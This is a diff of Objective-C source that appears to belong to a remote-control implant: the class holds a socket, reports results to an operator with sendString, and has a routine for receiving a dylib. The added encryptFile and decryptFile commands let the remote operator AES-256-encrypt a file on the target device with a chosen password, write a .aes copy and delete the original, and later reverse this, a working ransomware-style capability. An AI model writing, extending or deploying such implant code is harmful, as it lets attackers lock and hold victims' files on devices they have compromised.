@@ -297,6 +297,72 @@ int sockfd;
     }
 }
 
+-(void)encryptFile:(NSArray *)args {
+    BOOL isdir;
+    NSString *filepath = @"";
+    if (args.count > 2) {
+        filepath = [self forgetFirst:args];
+        NSString *last = [NSString stringWithFormat:@" %@",args[args.count -1]];
+        filepath = [filepath stringByReplacingOccurrencesOfString:last withString:@""];
+    }
+    else {
+        [self sendString:@"Usage: encrypt file password1234":_skey];
+        return;
+    }
+    
+    if ([_fileManager fileExistsAtPath:filepath isDirectory:&isdir]) {
+        if (isdir) {
+            [self sendString:[NSString stringWithFormat:@"%@ is a directory",filepath]:_skey];
+        }
+        else {
+            NSData *filedata = [_fileManager contentsAtPath:filepath];
+            [self sendString:[NSString stringWithFormat:@"Encrypting %@.aes with 256 Bit AES",filepath]:_skey];
+            filedata = [filedata AES256EncryptWithKey:args[args.count -1]];
+            [filedata writeToFile:[NSString stringWithFormat:@"%@.aes",filepath] atomically:true];
+            [_fileManager removeItemAtPath:filepath error:nil];
+        }
+    }
+    else {
+        [self sendString:[NSString stringWithFormat:@"%@ not found",filepath]:_skey];
+    }
+}
+
+-(void)decryptFile:(NSArray *)args {
+    BOOL isdir;
+    NSString *filepath = @"";
+    if (args.count > 2) {
+        filepath = [self forgetFirst:args];
+        NSString *last = [NSString stringWithFormat:@" %@",args[args.count -1]];
+        filepath = [filepath stringByReplacingOccurrencesOfString:last withString:@""];
+    }
+    else {
+        [self sendString:@"Usage: decrypt file.aes password1234":_skey];
+        return;
+    }
+    
+    if ([_fileManager fileExistsAtPath:filepath isDirectory:&isdir]) {
+        if (isdir) {
+            [self sendString:[NSString stringWithFormat:@"%@ is a directory",filepath]:_skey];
+        }
+        else {
+            if ([filepath containsString:@".aes"]) {
+                NSData *filedata = [_fileManager contentsAtPath:filepath];
+                [self sendString:[NSString stringWithFormat:@"Decrypting %@",filepath]:_skey];
+                filedata = [filedata AES256DecryptWithKey:args[args.count -1]];
+                [filedata writeToFile:[filepath substringToIndex:[filepath length] - 4] atomically:true];
+                [_fileManager removeItemAtPath:filepath error:nil];
+                
+            }
+            else {
+                [self sendString:[NSString stringWithFormat:@"Only supports .aes files"]:_skey];
+            }
+        }
+    }
+    else {
+        [self sendString:[NSString stringWithFormat:@"%@ not found",filepath]:_skey];
+    }
+}
+
 -(void)receiveDYLIB {
     NSString *fileData = @"";
     int bsize = 1024;
